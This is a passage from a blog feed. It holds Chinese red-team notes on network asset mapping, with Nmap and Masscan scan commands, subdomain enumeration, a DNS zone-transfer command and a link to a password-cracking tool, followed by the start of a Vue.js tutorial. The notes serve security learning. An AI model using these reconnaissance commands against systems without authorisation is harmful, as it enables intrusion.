    <content type="html"><![CDATA[<h1 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h1><h2 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h2><h3 id="目的与思路"><a href="#目的与思路" class="headerlink" title="目的与思路"></a>目的与思路</h3><p>目的：通过侦查和检索资产，发现存在的薄弱点和攻击面；</p><p>核心思路：通过先将目标网络IT资产进行规划分析建立知识库，在发生安全事件时能够在最短时间内完成安全应急。</p><h3 id="网络空间资产探测"><a href="#网络空间资产探测" class="headerlink" title="网络空间资产探测"></a>网络空间资产探测</h3><ul><li>IP存活性探测：确认目标IP的存活状态，通常利用ICMP（ping）、TCP等协议进行探测；</li><li>端口&#x2F;服务探测：识别在线主机的开放端口，目标主机的版本信息，服务信息，操作系统信息；常用工具为Zenmap、Nmap、Mapscan；</li><li>操作系统探测：分析网络响应，识别目标机器的网络协议特征；</li><li>应用类型探测：应用的服务网络协议特征，HTTP头部信息，数据库版本信息等； </li><li>别名探测：比如识别出，当一个路由器同时运行两个IP地址时的特殊情况；</li><li>DNS探测：识别DNS与IP地址的关联性，利用反向DNS解析技术；</li><li>流量探测：分析网络流量，识别网络资产；捕获流量中的IP地址，端口号等；</li></ul><h3 id="服务探测技术"><a href="#服务探测技术" class="headerlink" title="服务探测技术"></a>服务探测技术</h3><p>主要分类：</p><ul><li>主动探测：Nmap、ICMP等；</li><li>被动探测：监测网络流量，依赖于网络数据包，隐秘性高；</li><li>基于搜索引擎的非侵入式探测：Fofa、SHODAN等；</li></ul><h4 id="基于搜索引擎的非侵入式检测"><a href="#基于搜索引擎的非侵入式检测" class="headerlink" title="基于搜索引擎的非侵入式检测"></a>基于搜索引擎的非侵入式检测</h4><p>手段：</p><p>空间资产测绘引擎</p><ul><li><p>Fofa：<a href="https://fofa.info/">https://fofa.info/</a></p><ul><li>配套的开源工具：Fofa_Viewer v1.1.12</li></ul></li><li><p>SHODAN：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p></li><li><p>zoomeye：<a href="https://www.zoomeye.org/discover">ZoomEye - Cyberspace Search Engine</a></p></li></ul><p>工具：</p><ul><li>Smap：<a href="https://github.com/s0md3v/">https://github.com/s0md3v/</a></li></ul><h2 id="资产测绘常用手段"><a href="#资产测绘常用手段" class="headerlink" title="资产测绘常用手段"></a>资产测绘常用手段</h2><h3 id="资产测绘关键点"><a href="#资产测绘关键点" class="headerlink" title="资产测绘关键点"></a>资产测绘关键点</h3><ul><li>域名资产：互联网组织的标志，如baidu.com，cffex.com；</li><li>IP&#x2F;IP段资产：一个或多个IP对应着一台网络设备；</li><li>端口扫描和服务识别：通过端口扫描识别到运行在这些端口上的服务；</li><li>web站点指纹识别：查看一个网站运行的什么web架构、版本等，如Nginx；</li><li>Github关键字监控：对公开的github仓库监控，通过配置一些关键词组，从而监控到一些企业可能泄漏的源代码、API信息或密钥等；</li><li>域名&#x2F;IP资产监控：实时发现一些新的资产，如域名&#x2F;IP资产等；</li><li>站点变化监控：站点被篡改，网站内容被异常修改等；</li><li>文件泄漏风险检测：配置文件、备份文件等；</li></ul><h3 id="资产测绘常用工具"><a href="#资产测绘常用工具" class="headerlink" title="资产测绘常用工具"></a>资产测绘常用工具</h3><ul><li>Goby：<a href="https://gobysec.net/">https://gobysec.net</a></li><li>ARL：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></li><li>Fscan：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></li><li>LingLong：<a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a></li><li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li></ul><h3 id="TCP探测技术"><a href="#TCP探测技术" class="headerlink" title="TCP探测技术"></a>TCP探测技术</h3><p>TCP SYN SCAN被称为半开放扫描</p><p>操作步骤：</p><p>发送SYN包到目标端口，如果：</p><ul><li>收到SYN&#x2F;ACK回复，判断端口开放；</li><li>收到RST包，判断端口关闭；</li><li>没有收到回复，判断端口被屏蔽。</li></ul><h3 id="UDP探测技术"><a href="#UDP探测技术" class="headerlink" title="UDP探测技术"></a>UDP探测技术</h3><p>UDP SCAN通常用于判断UDP端口情况</p><p>操作步骤：</p><p>向目标主机的UDP端口发送探测包，如果：</p><ul><li>收到ICMP port unreachable回复，判断端口关闭；</li><li>没有收到回复，判断端口开放&#x2F;屏蔽；</li></ul><h3 id="ICMP探测技术"><a href="#ICMP探测技术" class="headerlink" title="ICMP探测技术"></a>ICMP探测技术</h3><p>通过构造ICMP请求报文并法案送给目标IP地址的方式对目标设备是否在线进行探测，若目标设备返回了ICMP回显应答，则表示目标设备在线；否则代表目标设备已下线。</p><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>Nmap是网络链接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统；</p><h5 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h5><ul><li>主机发现：通过发送不同的消息包实现；</li><li>端口扫描：不同端口对应的服务；</li><li>版本探测：判断不同端口对应的服务具体的版本信息；</li><li>操作系统探测；</li></ul><h5 id="Nmap服务探测顺序"><a href="#Nmap服务探测顺序" class="headerlink" title="Nmap服务探测顺序"></a>Nmap服务探测顺序</h5><ul><li>端口扫描：默认使用SYN扫描；</li><li>服务识别：发送探针报文，得到返回确认值，确认服务；</li><li>版本识别：发送探针报文，得到返回报文信息，分析得出服务的版本；</li></ul><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><h6 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h6><ul><li><p>Ping scan（-sn）</p><ul><li><p>ping扫描 ，禁用端口扫描；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ICMP pings（-PE，-PP，-PM）</p><ul><li><p>ICMP回显，时间戳和网络掩码请求发现探测；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ARP ping</p><ul><li><p>主机将ARP请求广播到网络上，并接收返回消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR example.com</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="端口选项"><a href="#端口选项" class="headerlink" title="端口选项"></a>端口选项</h6><ul><li>Open：端口开放，收到了适当回复；</li><li>closed：端口关闭，收到了RST；</li><li>flitered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确认状态</li><li>open|filtered：无法确认端口状态，通常与UDP有关。</li></ul><h6 id="服务探测参数"><a href="#服务探测参数" class="headerlink" title="服务探测参数"></a>服务探测参数</h6><ol><li>-sV：进行服务和版本的探测；</li><li>-sR：RPC扫描，判断端口是否为RPC端口，是则可以确定版本号；</li><li>–allports：不为版本探测排除任何接口；</li><li>–verson-intensity：设置版本扫描强度、数值越高，服务越准确；</li><li>–version-light：等于–version-intensity 2</li><li>–version-all：等于–version-intensity 9</li><li>–version-trace：跟踪版本扫描活动，打印出关于正在进行的扫描详细调试信息；</li></ol><h6 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h6><ul><li>-O：指定Nmap进行OS侦测；</li><li>–osscan-limit：只对确定的主机进行探测（该主机应至少分别有一个open和closed的端口）；</li><li>–osscan-guess：大胆猜测系统类型。准确性下降，尽可能多提供潜在的操作系统；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Q：为什么Nmap、Nmap -sV两次扫描出现的端口对应的服务版本不一样？</span><br><span class="line">A：前者在扫描到开放的端口后，通过在nmap-services数据库进行比对的方式进行结果的输出，并没有对目标端口所对应的真实服务做相应的扫描，而后者是真实进行了扫描的。</span><br></pre></td></tr></table></figure><h4 id="MASSCAN"><a href="#MASSCAN" class="headerlink" title="MASSCAN"></a>MASSCAN</h4><h5 id="版本侦测"><a href="#版本侦测" class="headerlink" title="版本侦测"></a>版本侦测</h5><ul><li>-p：指定要扫描的端口，同时指定多个端口用逗号隔开；</li><li>–rate：指定发包速率；</li><li>–banners：获取端口banner信息；</li><li>-oL：把扫描结果存放到指定文件中。</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan 192.168.2.0/24 -p0-65535 --rate 100000</span><br></pre></td></tr></table></figure><h4 id="MASNMAP"><a href="#MASNMAP" class="headerlink" title="MASNMAP"></a>MASNMAP</h4><p>masscan + nmap快速端口存活检测和服务识别的工具。</p><p><a href="https://github.com/starnightcyber/masnmap">https://github.com/starnightcyber/masnmap</a></p><h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p>最流行的漏洞扫描工具。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul><li><pre><code>dpkg -i Nessus-6.9.1-debian6_amd64.deb<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  service nessusd start</span><br></pre></td></tr></table></figure></code></pre></li></ul><h2 id="子域名检测"><a href="#子域名检测" class="headerlink" title="子域名检测"></a>子域名检测</h2><h3 id="子域名探测工具"><a href="#子域名探测工具" class="headerlink" title="子域名探测工具"></a>子域名探测工具</h3><ul><li><p>搜索引擎：使用Google、Baidu等搜索引擎的搜索语法：site: baidu.com；</p></li><li><p>空间搜索引擎：使用Fofa、shadon等的搜索语法：domain&#x3D;”baidu.com”；</p></li><li><p>证书透明度：证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中，一个SSL&#x2F;TLS证书通常包括域名、子域名或邮件地址。查找某个域名所属证书的最简单方法就是使用搜索引擎搜索一些公开的CT日志。</p><ul><li><a href="https://crt.sh/">https://crt.sh/</a></li><li><a href="https://censys.io/">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://transparencyreport.google.com/https/certificates/">https://transparencyreport.google.com/https/certificates/</a></li></ul></li><li><p>第三方查询接口：</p><ul><li>VirusTotal</li><li>DNSdumpster</li><li>Netcraft</li><li>ThreatCrowd</li><li>ReverseDNS</li></ul></li><li><p>域传送</p><p>域传送是一种DNS服务，DNS服务器将其全部或部分域文件的副本传递给另一个DNS服务器，如果未安全地配置域传送，则任何人都可以对指定名称地服务器启动域传送从而获取域文件副本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @DNS_Server AXFR target.com</span><br></pre></td></tr></table></figure></li><li><p><strong>脚本实现、脚本学习与推荐工具</strong></p><ul><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li></ul></li></ul><h2 id="弱口令检查工具"><a href="#弱口令检查工具" class="headerlink" title="弱口令检查工具"></a>弱口令检查工具</h2><p><a href="https://github.com/shack2/SNETCracker/releases/tag/1.0.20190715">https://github.com/shack2/SNETCracker/releases/tag/1.0.20190715</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;资产梳理&quot;&gt;&lt;a href=&quot;#资产梳理&quot; class=&quot;headerlink&quot; title=&quot;资产梳理&quot;&gt;&lt;/a&gt;资产梳理&lt;/h1&gt;&lt;h2 id=&quot;资产测绘&quot;&gt;&lt;a href=&quot;#资产测绘&quot; class=&quot;headerlink&quot; title=&quot;资产测绘&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="红军" scheme="https://erickinyae.github.io/tags/%E7%BA%A2%E5%86%9B/"/>
    
  </entry>
  
  <entry>
    <title>Vue</title>
    <link href="https://erickinyae.github.io/2023/12/28/Vue/"/>
    <id>https://erickinyae.github.io/2023/12/28/Vue/</id>
    <published>2023-12-28T00:59:18.000Z</published>
    <updated>2024-03-06T10:08:18.614Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="差值表达式"><a href="#差值表达式" class="headerlink" title="差值表达式"></a>差值表达式</h1><p>差值表达式是一种Vue的模板语法；</p><p>差值表达式不具备解析标签的能力；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--此处编写用于渲染的代码逻辑--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//一旦引入了VueJS核心包，在全局环境，就有了Vue构造函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//通过 el 配置选择器，指定vue管理的是哪个盒子</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//通过 data 提供数据</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          hello world!</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">            `</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>差值表达式，数据改变，试图将自动更新，使用Vue开发，只需要专注业务核心逻辑即可。</p><ul><li>作用：利用表达式进行插值，渲染到页面中；</li><li>表达式：是可以被求值的代码，Js引擎会将其计算出一个结果；</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; nickname.toUpperCase() &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;age &gt;= 18 ? &#x27;成年&#x27; : &#x27;未成年&#x27;&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; obj.name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>注意点：<ul><li>使用的数据必须存在（data）；</li><li>支持的是表达式，而非语句，比如 if for…；</li><li>不能在标签属性中使用<code>&#123;&#123; &#125;&#125;</code>插值；</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&#123;&#123; username &#125;&#125;&quot;</span>&gt;</span>我是p标签<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vue指令"><a href="#Vue指令" class="headerlink" title="Vue指令"></a>Vue指令</h1><p>Vue会根据不同的指令，针对标签实现不同的功能；</p><p>指令是指，带有<code>v-</code>前缀的特殊标签属性。</p><h2 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h2><p>动态地将data中绑定的文本按照html格式进行解析。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--此处编写用于渲染的代码逻辑--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       <span class="comment">//一旦引入了VueJS核心包，在全局环境，就有了Vue构造函数</span></span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="comment">//通过 el 配置选择器，指定vue管理的是哪个盒子</span></span></span><br><span class="line"><span class="language-javascript">           <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">           <span class="comment">//通过 data 提供数据</span></span></span><br><span class="line"><span class="language-javascript">           <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="attr">msg</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">               &lt;a href=&quot;https://www.baidu.com&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                   百度</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">               &lt;/a&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">               `</span></span></span><br><span class="line"><span class="language-javascript">           &#125;</span></span><br><span class="line"><span class="language-javascript">       &#125;)</span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h2><ul><li><p>底层原理：切换css的 display: none 来控制显示和隐藏；</p></li><li><p>作用：控制元素的显示与隐藏；</p></li><li><p>语法：<code>v-show=&quot;表达式&quot;</code>  表达式值 true显示，false隐藏；</p></li><li><p>使用场景：频繁切换显示隐藏的场景</p></li></ul><h2 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h2><ul><li><p>底层原理：根据 判断条件 控制元素的 创建 和 移除（条件渲染）；</p></li><li><p>作用：控制元素的显示与隐藏（条件渲染）；</p></li><li><p>语法：<code>v-if=&quot;表达式&quot;</code>  表达式值 true显示，false隐藏；</p></li><li><p>使用场景：要么显示、要么隐藏、不频繁切换的场景。</p></li></ul><blockquote><p><strong>v-show和v-if的区别：</strong></p><p>当v-show的boolean值和v-if的boolean值都为false时：</p><p>如果v-show为false，页面中还是会将该窗格进行渲染，只是会添加一个标签：<code>style=&quot;display: none&quot;</code>，使其隐藏起来；</p><p>如果v-if为false，页面中将不会渲染该窗格。</p></blockquote><h2 id="v-else和v-else-if"><a href="#v-else和v-else-if" class="headerlink" title="v-else和v-else-if"></a>v-else和v-else-if</h2><ul><li>作用：辅助 v-if 进行判断渲染；</li><li>语法：v-else v-else-if &#x3D; “表达式”；</li><li>注意：需要紧挨着 v-if 一起使用。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;gender === 1&quot;</span>&gt;</span>性别：♂ 男<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else</span>&gt;</span>性别：♀ 女<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;score &gt;= 90&quot;</span>&gt;</span>成绩评定A：奖励电脑一台<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score &gt;= 70&quot;</span>&gt;</span>成绩评定B：奖励周末郊游<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score &gt;= 60&quot;</span>&gt;</span>成绩评定C：奖励零食礼包<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else</span>&gt;</span>成绩评定D：惩罚一周不能玩手机<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">gender</span>: <span class="number">2</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">score</span>: <span class="number">95</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h2><ul><li><p>作用：注册事件 &#x3D; 添加监听 + 提供处理逻辑；</p></li><li><p>语法：</p><ul><li><p>v-on：事件名 &#x3D; “内联语句”；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>v-on：事件名 &#x3D; “methods中的函数名”；</p></li></ul></li><li><p>简写：@事件名<code>v-on:click=“”</code>可以简写为<code>@click=“”</code></p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count--&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">count</span>: <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;fn&quot;</span>&gt;</span>切换显示隐藏<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app4 = <span class="keyword">new</span> <span class="title 